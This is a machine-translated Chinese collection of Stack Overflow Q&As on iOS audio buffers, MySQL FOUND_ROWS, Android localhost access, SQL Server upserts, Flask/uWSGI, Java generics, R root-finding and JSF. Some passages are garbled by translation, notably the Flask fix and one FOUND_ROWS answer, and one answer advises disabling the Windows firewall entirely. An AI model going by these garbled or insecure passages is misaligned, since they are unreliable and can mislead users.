                                                             blockBuffer2,
                                                             YES,   // Yes data is ready
                                                             NULL,  // No callback needed to make data ready
                                                             NULL,
                                                             audioFormatDescription_,
                                                             1,
                                                             timestamp,
                                                             NULL,
                                                             &sampleBuffer);

    if (status != noErr)
    {
        NSLog(@"CMAudioSampleBufferCreateWithPacketDescriptions error.");
        CFRelease(blockBuffer1);
        CFRelease(blockBuffer2);
        return;
    }

    if ([self.audioWriterInput isReadyForMoreMediaData])
    {
        if (![self.audioWriterInput appendSampleBuffer:sampleBuffer])
        {
            NSLog(@"Couldn't append audio sample buffer: %d", numAudioCallbacks_);
        }
    } else {
        NSLog(@"AudioWriterInput isn't ready for more data.");
    }

    // One release per create
    CFRelease(blockBuffer1);
    CFRelease(blockBuffer2);
    CFRelease(sampleBuffer);
} 
```

如您所见，每次创建时我都会释放每个缓冲区一次。我已经将“泄漏”追溯到附加音频缓冲区的行：

```
[self.audioWriterInput appendSampleBuffer:sampleBuffer] 
```

我通过注释掉该行向自己证明了这一点，之后我得到了以下“无泄漏”分配图（当然，现在录制的视频现在没有音频了）：

![无泄漏](../Images/b3f65bedae49638108e503a01570b6f5.png)

我尝试了另一件事，即加回该`appendSamplebuffer`行，而不是 double-release `blockBuffer2`：

```
CFRelease(blockBuffer1);
CFRelease(blockBuffer2);
CFRelease(blockBuffer2); // Double release to test the hypothesis that appendSamplebuffer is retaining this
CFRelease(sampleBuffer); 
```

这样做***不会***导致双重释放，表明`blockBuffer2`此时的保留计数为 2。这产生了相同的“无泄漏”分配图，除了当我调用 时`[self.videoWriter endSessionAtSourceTime:...]`，我从双重释放中崩溃了release （表示`self.videoWriter`正在尝试释放其所有指向`blockBuffer2`已传入的 s 的指针）。

如果相反，我尝试以下方法：

```
CFRelease(blockBuffer1);
CFRelease(blockBuffer2);
CMSampleBufferInvalidate(sampleBuffer); // Invalidate sample buffer
CFRelease(sampleBuffer); 
```

然后`[self.audioWriterInput appendSampleBuffer:sampleBuffer]` ***，***在此之后的每个呼叫都开始附加视频帧的呼叫失败。

所以我的结论是，`AVAssetWriter`或者在视频完成录制之前一直`AVAssetWriterInput`保留。`blockBuffer2`显然，如果视频录制时间足够长，这可能会导致真正的内存问题。难道我做错了什么？

编辑：我得到的音频字节是 PCM 格式，而我正在编写的视频格式是 MPEG4，而该视频的音频格式是 MPEG4AAC。视频编写器是否有可能正在执行 PCM --> AAC 格式，这就是它被缓冲的原因？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T17:16:37.033

由于您已经等待了一个月的答案，我会给您一个不太理想但可行的答案。

您可以使用 ExtendedAudioFile 函数来编写单独的文件。然后你可以用 AVComposition 一起播放视频和音频。如果您需要在录制结束时将它们合成，我认为您可以使用 AVFoundation 将 caf 和视频合成在一起而无需重新编码。

这将使您启动并运行，然后您可以在闲暇时解决内存泄漏。

# php - SELECT FOUND_ROWS() 在 mysql 中返回 1

> ID：14847467
> 
> 赞同：6
> 
> 时间：2013-02-13T06:08:06.497
> 
> 标签：php, mysql, sql

SELECT FOUND_ROWS() 不工作或返回 1 我不知道我在哪里出错

```
$qry ="SELECT SQL_CALC_FOUND_ROWS DISTINCT user_id, login_date
FROM login_members
WHERE (login_date BETWEEN '2012-02-13 00:00:00' AND '2013-02-13 23:59:59') 
LIMIT 0, 10";

$rs = mysql_query($qry);

$total_records = mysql_result(mysql_query("SELECT FOUND_ROWS()"),0,0); 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-09-19T07:35:51.997

接受的答案似乎是错误的。因为它建议在使用 LIMIT 的查询之后使用 found_rows() 。

**答案**：问题是关于 RETURN 1 和在某些情况下 0 作为 found_rows(); 的结果。

在您的第一个 select 语句之后执行一些其他查询时会发生这种情况。特别是当您使用 IDE 或某些客户端运行查询时，会在查询之前和之后执行一些附加的“准备”查询。

found_rows() 将返回服务器上运行的 LAST 查询返回的结果数。在这种情况下，这不是我们所期望的。

因此返回 1 或 0 错误。

**验证：** 您可以通过在服务器上启用常规日志记录并执行查询来验证这一点。您将看到在“第一个查询和找到的行查询”之间执行了几个附加查询。

**FIX** 存储过程，或旧的 COUNT(*)。

性能方面几乎没有任何区别。

**额外的**

如果您的目标是查找返回的总行数，那很好。并且 SQL_CALC_FOUND_ROWS 的使用变得无关紧要。

这是一般规则，找到的行不需要 LIMIT，SQL_CALC_FOUND_ROWS 也不需要。但是它们中的三个可以一起使用来给出一个非常有用的结果。

即运行类似的东西。

```
SELECT  SQL_CALC_FOUND_ROWS * from some_table_name LIMIT 0,10; 
SELECT FOUND_ROWS(); 
```

如果我们运行 SELECT * from sometable_name，我们将获得查询将返回的行数；即：没有限制。

话说回来，

```
SELECT * from some_table_name LIMIT 0, 10; 
SELECT FOUND_ROWS(); 
```

会给我们结果的总数，其中限制的 cos 将 <=10。并且没有任何实际用途，但这不是错误。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-13T06:16:06.907

一个`SELECT`语句可能包含一个`LIMIT`子句来限制服务器返回给客户端的行数。在某些情况下，希望知道在没有 LIMIT 的情况下该语句将返回多少行，但无需再次运行该语句。要获取此行数，`SQL_CALC_FOUND_ROWS`请在语句中包含一个选项`SELECT`，然后调用`FOUND_ROWS()`：

```
mysql> SELECT SQL_CALC_FOUND_ROWS * FROM tbl_name
    -> WHERE id > 100 LIMIT 10;

mysql> SELECT FOUND_ROWS(); 
```

第二个返回一个数字，表示如果没有该子句`SELECT`，第一个将返回多少行。`SELECT``LIMIT`

[http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_found-rows](http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_found-rows)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-02-13T06:13:09.657

使用这个查询

```
$qry ="SELECT DISTINCT user_id, login_date
FROM login_members
WHERE (login_date BETWEEN '2012-02-13 00:00:00' AND '2013-02-13 23:59:59') 
LIMIT 0, 10"; 
```

如果前面的 SELECT 包含 SQL_CALC_FOUND_ROWS，但如果前面的 SELECT 不包含 SQL_CALC_FOUND_ROWS，则 FOUND_ROWS() 返回前面的 SELECT 返回的行数

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T06:29:28.923

应该 ：

```
$qry ="SELECT DISTINCT user_id, login_date FROM login_members
WHERE (login_date BETWEEN '2012-02-13 00:00:00' AND '2013-02-13 23:59:59') 
LIMIT 0, 10";

$rs = mysql_query($qry);

$total_records = mysql_result(mysql_query("SELECT FOUND_ROWS()"),0,0);

echo $total_records // display total record count 
```

没有必要使用`SQL_CALC_FOUND_ROWS`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T07:44:49.567

`SQL_CALC_FOUND_ROWS`并且`FOUND_ROWS()`在您想要限制查询返回的行数时很有用，但也可以在不再次运行查询的情况下确定完整结果集中的行数。一个示例是一个 Web 脚本，它呈现一个分页显示，其中包含指向显示搜索结果其他部分的页面的链接。使用`FOUND_ROWS()`允许您确定其余结果需要多少其他页面。

```
mysql> SELECT SQL_CALC_FOUND_ROWS * FROM tbl_name
    -> WHERE id > 100 LIMIT 10;
mysql> SELECT FOUND_ROWS(); 
```

第二个返回一个数字，表示 如果没有该子句`SELECT`，第一个将返回多少行。 如果最近成功的 语句中没有该选项，则返回该语句返回的结果集中的行数。如果语句包含子句， 则返回不超过限制的行数。例如，如果语句包含or ，则分别返回 10 或 60 。`SELECT``LIMIT``SQL_CALC_FOUND_ROWS``SELECT``FOUND_ROWS()``LIMIT``FOUND_ROWS()``FOUND_ROWS()``LIMIT 10``LIMIT 50, 10`

```
$qry ="SELECT SQL_CAL_FOUND_ROWS  *  
       FROM login_members
       WHERE (login_date BETWEEN '2012-02-13 00:00:00' AND '2013-02-13 23: 
59:59') 
       LIMIT 0, 10";

$rs = mysql_query($qry);

$total_records = mysql_query("SELECT FOUND_ROWS() as `found_rows`;");

echo $total_records // display total record count 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-08-08T21:19:53.527

对于总记录，使用简单：

```
 $total_records = array_shift(mysql_fetch_row(mysql_query('SELECT FOUND_ROWS()'))); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-11-29T16:21:46.460

您必须将 mysql.trace_mode 设置为关闭。

在每个 php 页面中使用它。

```
ini_set("mysql.trace_mode", "0"); 
```

或者您可以在 .htaccess 文件中设置它

```
php_value mysql.trace_mode "0" 
```

这里：

```
<?php
ini_set("mysql.trace_mode", "0");

$qry ="SELECT SQL_CALC_FOUND_ROWS DISTINCT user_id, login_date
FROM login_members
WHERE (login_date BETWEEN '2012-02-13 00:00:00' AND '2013-02-13 23:59:59') 
LIMIT 0, 10";

$rs = mysql_query($qry);

$total_records = mysql_result(mysql_query("SELECT FOUND_ROWS()"),0,0);
echo $total_records;
?> 
```

# android - 如何访问 android 设备中的 wamp localhost 进行测试？

> ID：14847471
> 
> 赞同：1
> 
> 时间：2013-02-13T06:08:16.367
> 
> 标签：android

在模拟器中，我使用这个 10.0.2.2 ip 地址来测试它工作正常的应用程序，但它不适用于在 android 设备中进行测试。我通过 USB 电缆连接设备。如何使用本地主机在设备中测试应用程序。任何人都知道帮我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T08:22:02.010

使用 WIFI 是您问题的最佳解决方案..并使用您的 IP 地址进行连接...从 android 设备到本地服务器..:-)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-01-17T14:30:00.127

1.  在电脑上启动 Wamp 服务器
2.  单击 Wamp windows 任务栏
3.  点击“Put Online”（wamp 底部）
4.  运行命令提示符
5.  输入 ipconfig 并输入
6.  记下您的 IPv4 地址（在我的情况下为 192.168.1.206）
7.  确保您的 pc 和 android 使用相同的 wifi 连接
8.  确保您的 wifi 网络为“家庭网络”
9.  在安卓上打开浏览器
10.  输入您的 IPv4 地址

我希望这会有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T06:15:04.040

USB 不会为您提供网络。

希望这会帮助你。

[如何从我的 Android 设备访问我的本地主机？](https://stackoverflow.com/questions/4779963/how-can-i-access-my-localhost-from-my-android-device)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-10-30T10:44:54.487

使用 Connectify Software，并在您的 android 代码中插入系统的 IP 地址，而不是 10.0.0.2。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-11-13T12:23:33.483

对于 Windows 10 用户

> 1.  转到控制面板-> 系统和安全-> Windows Defender 防火墙-> 打开或关闭 Windows Defender 防火墙。

将专用网络和公共网络设置都设置为关闭。

> 2.  打开命令提示符。输入 ipconfig 并记下您的 IP。
>     
>     
> 3.  在你的安卓设备上打开浏览器并输入你电脑的 IP。

我用它和WIFI一起使用，效果很好。

# sql - 使用标识列插入和更新的存储过程

> ID：14847476
> 
> 赞同：2
> 
> 时间：2013-02-13T06:08:23.047
> 
> 标签：sql, sql-server, sql-server-2008

我有一个名为'tasks'的表，它`'task id'`是标识列，对于该表，我必须编写保存存储过程，当没有给出'task id'时它应该插入值，而当给出'task id'时它应该更新表格。

当任务 id 是身份列时，如何实现这一点，任何人都可以举例说明。这是代码

```
Alter PROCEDURE TaskSave
(
@taskid int,   
@ProjectId int,
@EmployeeId int,
@TaskName nvarchar(50),
@Duration_Hrs int,
@StartDate nvarchar(20),
@FinishDate nvarchar(20),
@CreateUserId int,
@CreatedDate nvarchar(20),
@ModifiedUserID int,
@ModifiedDate nvarchar(20),
@Is_CommonTask bit
) AS

BEGIN
    IF Exists( select null from TblTasks where TaskId=@TaskId)
    BEGIN
        INSERT TblTasks
        VALUES (@ProjectId,@EmployeeId,@TaskName,@Duration_Hrs,
                @StartDate,@FinishDate,@CreateUserId,@CreatedDate,
                @ModifiedUserID,@ModifiedDate,@Is_CommonTask)
    END
    ELSE
    BEGIN
        UPDATE TblTasks SET 
        StartDate=@StartDate,FinishDate=@FinishDate,
        Duration_Hrs=@Duration_Hrs 
        WHERE TaskId=@TaskId
    END
END
GO 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:24:08.507

您已关闭，检查记录是否不存在并执行插入，否则更新。您还可以使用以下函数将`@TaskId`参数声明为`OUTPUT`并在插入时返回它`SCOPE_IDENTITY()`：

```
ALTER PROCEDURE TaskSave(
    @TaskId INT = NULL OUTPUT
    , @ProjectId INT
    , @EmployeeId INT
    , @TaskName NVARCHAR(50)
    , @Duration_Hrs INT
    , @StartDate NVARCHAR(20)
    , @FinishDate NVARCHAR(20)
    , @CreateUserId INT
    , @CreatedDate NVARCHAR(20)
    , @ModifiedUserID INT
    , @ModifiedDate NVARCHAR(20)
    , @Is_CommonTask BIT
)
AS
BEGIN

    IF NOT(EXISTS(SELECT * FROM TblTasks WHERE TaskId = @TaskId))
    BEGIN
        INSERT INTO TblTasks(
            ProjectId
            , EmployeeId
            , TaskName
            , Duration_Hrs
            , StartDate
            , FinishDate
            , CreateUserId
            , CreatedDate
            , ModifiedUserID
            , ModifiedDate
            , Is_CommonTask
        )
        VALUES(
            @ProjectId
            , @EmployeeId
            , @TaskName
            , @Duration_Hrs
            , @StartDate
            , @FinishDate
            , @CreateUserId
            , @CreatedDate
            , @ModifiedUserID
            , @ModifiedDate
            , @Is_CommonTask
        )
        SET @TaskId = SCOPE_IDENTITY()
    END
    ELSE
    BEGIN
        UPDATE TblTasks SET 
            StartDate = @StartDate
            , FinishDate = @FinishDate
            , Duration_Hrs = @Duration_Hrs
        WHERE TaskId=@TaskId
    END
END
GO 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:25:23.730

首先，给你的输入变量 TaskID 一个默认值，如下所示，然后简单地检查变量是否为 NULL，如果是，插入一个新行

```
Alter PROCEDURE TaskSave
(
@taskid int = NULL,   
@ProjectId int,
@EmployeeId int,
@TaskName nvarchar(50),
@Duration_Hrs int,
@StartDate nvarchar(20),
@FinishDate nvarchar(20),
@CreateUserId int,
@CreatedDate nvarchar(20),
@ModifiedUserID int,
@ModifiedDate nvarchar(20),
@Is_CommonTask bit
) AS

BEGIN

    IF @taskid IS NULL
    BEGIN
        INSERT TblTasks
        VALUES (@ProjectId,@EmployeeId,@TaskName,@Duration_Hrs,
                @StartDate,@FinishDate,@CreateUserId,@CreatedDate,
                @ModifiedUserID,@ModifiedDate,@Is_CommonTask)
    END
    ELSE
    BEGIN
        UPDATE TblTasks SET 
        StartDate=@StartDate,FinishDate=@FinishDate,
        Duration_Hrs=@Duration_Hrs 
        WHERE TaskId=@TaskId
    END

END
GO 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:41:48.307

将参数声明`@taskid`为 NULL。如果它为空，则插入其他更新。见下文。

```
Alter PROCEDURE TaskSave
(
@taskid int =NULL,   
@ProjectId int,
@EmployeeId int,
@TaskName nvarchar(50),
@Duration_Hrs int,
@StartDate nvarchar(20),
@FinishDate nvarchar(20),
@CreateUserId int,
@CreatedDate nvarchar(20),
@ModifiedUserID int,
@ModifiedDate nvarchar(20),
@Is_CommonTask bit
) AS

BEGIN
  if @taskid is null
  BEGIN
        INSERT TblTasks
        VALUES (@ProjectId,@EmployeeId,@TaskName,@Duration_Hrs,
                @StartDate,@FinishDate,@CreateUserId,@CreatedDate,
                @ModifiedUserID,@ModifiedDate,@Is_CommonTask)
    END
  ELSE
    BEGIN
        UPDATE TblTasks SET 
        StartDate=@StartDate,FinishDate=@FinishDate,
        Duration_Hrs=@Duration_Hrs 
        WHERE TaskId=@taskid
    END
END
GO 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T07:28:10.283

在这种情况下，我曾经创建一个能够插入、更新和删除项目的通用存储过程。一般模式看起来像这样

```
create procedure Modify_MyTable
  @Action char(1),
  @Data int,
  @PK int output
as
  if @Action = 'I' begin -- Insert
    insert into MyTable (Data) values (@Data)
    set @PK = Scope_Identity()
  end
  if @Action = 'M' begin -- Modify
    update MyTable set Data = @Data where PKID = @PK
  end
  if @Action = 'D' begin -- Delete
    delete MyTable where PKID = @PK
  end 
```

很久以前我使用过它，但我发现它非常方便，因为我在一个 SP 中拥有所有操作代码（当然我可以使用三个），并且还可以在此过程中添加日志记录功能和其他基本逻辑。

我并不是说这仍然是最好的方法，但它应该显示基本逻辑。

# python - Flask + uwsgi + nginx: TypeError: ... 不接受任何参数（给定 2 个）

> ID：14847477
> 
> 赞同：2
> 
> 时间：2013-02-13T06:08:23.667
> 
> 标签：python, nginx, flask, uwsgi

我在我的 ubuntu 12.04 homerserver 上安装了带有 nginx 的 uwsgi，并尝试测试一个简单的 Flask-App：

```
from flask import Flask
app = Flask(__name__)

@app.route('/')
def application():
    return 'Hello World!'

if __name__ == '__main__':
    app.run() 
```

和`python app.py`它一起工作。但不与`uwsgi --socket 127.0.0.1:3031 --file /srv/www/test/app.py --callable application --catch-exceptions`

我只是收到这个错误`TypeError: application() takes no arguments (2 given)`，不知道为什么。这两个论点从何而来？

这是我的 uwsgi.conf：

```
 1 description "uWSGI Emperor"
  2 start on runlevel [2345]
  3 stop on runlevel [06]
  4 respawn
  5
  6 exec uwsgi --master --die-on-term --emperor /etc/uwsgi/apps-enabled 
```

和我的 nginx.conf

```
server {
 94      listen 8000;
 95      server_name localhost;
 96      root /srv/www/test;
 97
 98      location /static/ {
 99      alias /srv/www/test/static/;
100      expires 30d;
101      access_log off;
102      }
103
104      location / {
105      include uwsgi_params;
106      uwsgi_pass 127.0.0.1:3031;
107  }
108 } 
```

我之前在启用了应用程序的 .ini 文件中尝试过，但我也遇到了这种错误。

我希望有人能帮助我。:\

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T06:16:47.220

“应用程序”是可调用的烧瓶（由您定义）而不是可调用的 WSGI（就像您在 uWSGI 中配置的那样）。您的 WSGI 可调用对象是“app”（主入口点）。只需将 --callable 应用程序更改为 --callable 应用程序

# ruby-on-rails-3 - 使 Twitter Bootstrap 响应式

> ID：14847478
> 
> 赞同：0
> 
> 时间：2013-02-13T06:08:35.933
> 
> 标签：ruby-on-rails-3, twitter-bootstrap, responsive-design

我有一个正在开发的网站（[http://www.snippet-monkey.com](http://www.snippet-monkey.com)）。该站点是使用 Twitter Bootstrap 和 Rails3 开发的。

现在布局在不同的浏览器中显示不同的行为。它在我的笔记本电脑上的所有浏览器上都能正常工作，但在其他机器上却失败了，在许多其他机器上也能正常工作。

如何将此布局转换为响应式？非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:54:57.353

添加@import“twitter/bootstrap/responsive”；

到您的 bootstrap_and_overrides.css.less 文件

默认情况下，这些天引导程序未配置为响应式，您必须添加此功能，这是最简单的方法

# java - 类型安全：ArrayList[] 类型的表达式需要未经检查的转换

> ID：14847480
> 
> 赞同：1
> 
> 时间：2013-02-13T06:08:38.027
> 
> 标签：java, multithreading, casting

我正在从事一个项目，在该项目中，我在初始化具有特定大小的一种方法时遇到了 TypeSafety 问题。在我的运行方法中，我有黄线`new ArrayList[tableLists.size()]`并抱怨 -

`Type safety: The expression of type ArrayList[] needs unchecked conversion to conform to ArrayList<Method>[]`

下面是代码。

```
private ArrayList<Method> methods[] = null;

    @Override
    public void run() {

        methods = new ArrayList[tableLists.size()];

    } 
```

我怎样才能`TypeSafety`在这里解决这个问题？

**更新：-**

```
 int j = 0;
    dbConnection = new Connection[tableLists.size()];
    callableStatement = new CallableStatement[tableLists.size()];
    methods = new ArrayList[tableLists.size()];

    //loop around the map values and make the connection list
    for (Map<String, String> map : tableLists.values()) {

        dbConnection[j] = getDBConnection(map.get("URL"), map.get("USER"), map.get("PASSWORD"), map.get("DRIVER"));
        callableStatement[j] = dbConnection[j].prepareCall(map.get("SQL"));

        methods[j] = getRequiredMethods(map.get("SUFFIX"));
        j++;
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:18:41.297

由于这些方法本身似乎没有以任何特定方式分开，为什么不将它们全部存储在同一个`ArrayList`中，完全绕过问题呢？

```
ArrayList<Method> methods;

/* ... */

methods.addAll(getRequiredMethods(map.get("SUFFIX"))); 
```

数组和泛型往往不能很好地相互配合。如果你*真的*需要分离，你必须主要选择：

1.  Use an `ArrayList<ArrayList<Method>>` instead of an array. This will let you handle everything nicely without mucking with plain arrays. You can then efficiently initialize the `methods` object with a size just like with a regular array.

    ```
    methods = new ArrayList<ArrayList<Method>>(tableLists.size()); 
    ```

2.  If you *really* need to use an array, you'll probably have to suppress the warning using the `@SuppressWarnings("unchecked")` annotation. This is ugly and annoying, so I'd avoid it if you can.

# android - Textview不会随着android 3d carousel中的更改选择而改变

> ID：14847484
> 
> 赞同：2
> 
> 时间：2013-02-13T06:08:58.850
> 
> 标签：android, carousel, textview

我正在尝试在我的 android 应用程序中使用 Android 3D Carousel (codeproject.com/Articles/146145/Android-3D-Carousel)。在演示中，活动顶部有一个文本视图，其中文本随着 3D 轮播中的选择发生变化而变化。这是活动中使用的 main.xml 的 xml。

```
 <com.carouseldemo.controls.Carousel
        android:id="@+id/carousel"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:animationDuration="200"
        pj:Items="@array/entries"
        pj:Names="@array/names"
        pj:SelectedItem="0"
        pj:UseReflection="true" />

<TextView
    android:id="@+id/selected_item"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_weight="0.8"
    android:background="#1E1921"
    android:text="text"
    android:textColor="#FFF"
    android:textStyle="normal" /> 
```

数组“@array/entries”和“@array/names”每个都包含 6 个项目。问题是当我尝试增加编号时。在这些数组中的项目中，活动中的 TextView (selected_item) 具有随着轮播中项目的选择而发生变化的数据停止变化。它只显示第一项。下面是 TextView 的代码：-

```
 carousel.setOnItemSelectedListener(new OnItemSelectedListener(){

        public void onItemSelected(CarouselAdapter<?> parent, View view,
                int position, long id) {

            final TextView txt = (TextView)(findViewById(R.id.selected_item));

            switch(position){
            case 0:
                txt.setText("The cat (Felis catus), also known as the domestic cat or housecat to distinguish it from other felids and felines, is a small, usually furry, domesticated, carnivorous mammal that is valued by humans for its companionship and for its ability to hunt vermin and household pests. Cats have been associated with humans for at least 9,500 years, and are currently the most popular pet in the world. Owing to their close association with humans, cats are now found almost everywhere in the world.");
                break;
            case 1:
                txt.setText("The hippopotamus (Hippopotamus amphibius), or hippo, from the ancient Greek for \"river horse\" (ἱπποπόταμος), is a large, mostly herbivorous mammal in sub-Saharan Africa, and one of only two extant species in the family Hippopotamidae (the other is the Pygmy Hippopotamus.) After the elephant, the hippopotamus is the third largest land mammal and the heaviest extant artiodactyl.");
                break;
            case 2:
                txt.setText("A monkey is a primate, either an Old World monkey or a New World monkey. There are about 260 known living species of monkey. Many are arboreal, although there are species that live primarily on the ground, such as baboons. Monkeys are generally considered to be intelligent. Unlike apes, monkeys usually have tails. Tailless monkeys may be called \"apes\", incorrectly according to modern usage; thus the tailless Barbary macaque is called the \"Barbary ape\".");
                break;
            case 3:
                txt.setText("A mouse (plural: mice) is a small mammal belonging to the order of rodents. The best known mouse species is the common house mouse (Mus musculus). It is also a popular pet. In some places, certain kinds of field mice are also common. This rodent is eaten by large birds such as hawks and eagles. They are known to invade homes for food and occasionally shelter.");
                break;
            case 4:
                txt.setText("The giant panda, or panda (Ailuropoda melanoleuca, literally meaning \"black and white cat-foot\") is a bear native to central-western and south western China.[4] It is easily recognized by its large, distinctive black patches around the eyes, over the ears, and across its round body. Though it belongs to the order Carnivora, the panda's diet is 99% bamboo.");
                break;
            case 5:
                txt.setText("Rabbits (or, colloquially, bunnies) are small mammals in the family Leporidae of the order Lagomorpha, found in several parts of the world. There are eight different genera in the family classified as rabbits, including the European rabbit (Oryctolagus cuniculus), cottontail rabbits (genus Sylvilagus; 13 species), and the Amami rabbit (Pentalagus furnessi, an endangered species on Amami Ōshima, Japan)");
                break;
            }

        }

        public void onNothingSelected(CarouselAdapter<?> parent) {
        }

    }
    ); 
```

以及条目和名称数组的 xml：-

```
<resources xmlns:android="http://schemas.android.com/apk/res/android">
<array name="entries">
    <item>@drawable/cat</item>      
    <item>@drawable/hippo</item>        
    <item>@drawable/monkey</item>       
    <item>@drawable/mouse</item>
    <item>@drawable/panda</item>        
    <item>@drawable/rabbit</item>                       
</array>    
<array name="names">
    <item>The cat</item>
    <item>The hippo</item>
    <item>The monkey</item>
    <item>The mouse</item>
    <item>The panda</item>
    <item>The rabbit</item>
</array> 
```

请帮忙。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T06:56:17.530

在这里找到解决方案：-

在 Carousel.java 中：-

将“如果（角度！= 0.0f）”更改为“如果（Math.abs（角度）> 4）”

[http://code.google.com/p/android-carousel-demo/issues/detail?id=1](http://code.google.com/p/android-carousel-demo/issues/detail?id=1)

# r - 当函数等于某个值时

> ID：14847489
> 
> 赞同：4
> 
> 时间：2013-02-13T06:09:06.593
> 
> 标签：r, statistics

我对 R 非常陌生，所以解决这个问题可能相对简单。我有以下函数来计算普通汽车的停车距离：

```
distance <- function(mph){(2.0*(mph/60))+(0.062673*(mph^1.9862))} 
```

我正在绘制从 1 mph 到 60 mph 的所有停车距离：

```
range = distance(1:60) 
```

但我需要标记停止距离等于 120 英尺的位置。我不知道这是如何在 R 中完成的，但我想编写一个函数，对于停止距离（x），我得到汽车的最大速度，以 MPH 为单位。我应该使用什么函数，有没有一种简单的方法来检查距离（x）的值（如上面所写）是否等于某个值？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T06:24:19.373

一种方法是查找函数 -120 何时等于 0：

```
distance <- function(mph, dist=0){(2.0*(mph/60))+(0.062673*(mph^1.9862))-dist}
uniroot(distance, c(1, 60), dist=120)
## $root
## [1] 44.63998
##
## $f.root
## [1] -5.088982e-06
##
## $iter
## [1] 6
##
## $estim.prec
## [1] 6.103516e-05 
```

看看它是否有效：

```
distance(44.63998)
## [1] 120 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2021-01-13T22:42:54.493

我知道这是一个老问题并且有一个公认的答案，但我想指出另一种方法来实现这一点 - 创建反函数。由于您拥有该功能，因此很容易在合理范围内生成许多 xy 点。然后通过使 y 成为 x 的函数来简单地创建反函数。在你的例子中，

```
x = seq(0,150,0.05)
y = distance(x)
speed = approxfun(y,x) 
```

现在让我们确认它给出了很好的答案：

```
speed(120)
[1] 44.63998
distance(speed(120))
[1] 120 
```

# jsf - 如何在jsf中将商店实体合并到客户实体（多对一）

> ID：14847492
> 
> 赞同：0
> 
> 时间：2013-02-13T06:09:27.193
> 
> 标签：jsf, jpa, ejb, facelets

我正在尝试将现有商店合并到 jsf 中的新客户，但没有成功。该程序基本上由一个支持 bean 控制器、一个 ejb 和 jsf 页面（注册）组成，我已经能够在组合框 UI 中填充购物清单。这是代码。

注册.xhtml：

`clientcontroller.client.fname`是一个SFSB。
`Property`已经坚持但试图合并。
列表中的商店 ( `shopcontroller.shopList`)

```
<h:form>
<h:panelGrid columns="3" >
<h:outputText value="Select From.  
 Available    Shops :" />     
 <h:selectOneMenu value="#. 
 {shopController.shop}" >
 <f:selectItems var="s" value="#.    
 {shopController.shopList}" />   
  </h:selectOneMenu>

 <h:commandButton value="register".   
  action="#{clientcontroller.Register(s)}" />
 </h:panelGrid>
</h:form> 
```

支持bean类：

```
ManagedBean(name="clientcontroller")
@RequestScoped
public class clientController {

@EJB ClientEJB clientEJB;

 private Client clt = new Client();
 private Shop shp = new Shop();
 private String clientfname;

//getters and setters

public String Register(Shop shp){
  this.shp = shp;
  clientEJB.register(clt, shp);
  return ""; 
} 
```

EJB 类：

```
@Stateful
@LocalBean
public class ClientEJB {

  @PersistenceContext 
  EntityManager em;

  public void addClient(Client clt){
    em.persist(clt);
  }

  public void register(Client c ,Shop s){
    c.getShopList().add(s);
    s.setAvailability("false");
    s.setClientid(c);
    em.merge(s);
    em.merge(c);
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T09:44:06.003

调整您的代码如下：

XHTML：

```
 <h:commandButton value="register" action="#{clientcontroller.Register}" /> 
```

托管豆

```
 public String Register(){
      clientEJB.register(clt, shp);
      return ""; 
  } 
```

也可以看看：

*   [JSF 2 下拉框示例](http://www.mkyong.com/jsf2/jsf-2-dropdown-box-example/)

# javascript - 我想在不改变 alpha 值的情况下为像素着色。怎么办？这对我不起作用

> ID：14847494
> 
> 赞同：1
> 
> 时间：2013-02-13T06:09:31.627
> 
> 标签：javascript, html5-canvas, getimagedata, putimagedata

```
window.onload = function() {
                var Can1 = document.getElementById('canvas2');

                    var ctx = Can1.getContext("2d");
                    Can1.width=960;
                    Can1.height=720;
                        //ctx.fillStyle = "rgba(0,255,0,0)";
                        //ctx.fillRect(0,0,960,720);
                    var imgData=ctx.getImageData(0,0,960,720);
                     for (var i=0;i<imgData.data.length;i+=4)
                          {
                             imgData.data[i]=255/*-imgData.data[i]*/;
                             imgData.data[i+1]=0/*255-imgData.data[i+1]*/;
                             imgData.data[i+2]=0/*255-imgData.data[i+2]*/;
                             imgData.data[i+3]=255-imgData.data[i+3];
                          }
                          ctx.putImageData(imgData,0,0);

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T16:44:39.783

这会将画布的每个像素更改为红色，alpha 不变；

```
 var Can1 = document.getElementById("canvas2");
    var ctx = Can1.getContext("2d");

    // get all canvas pixel data
    imgData = ctx.getImageData(0, 0, Can1.width, Can1.height);

    // change every pixel on the canvas to rgba(255,0,0,255);
    for (var i=0;i<imgData.data.length;i+=4){
        imgData.data[i]=255     // this is the red component of this pixel
        imgData.data[i+1]=0     // this is the green component of this pixel
        imgData.data[i+2]=0     // this is the blue component of this pixel
        // To keep the alpha the same, just leave .data[i+3] unchanged
        //imgData.data[i+3];  // this is the alpha component of this pixel
    }

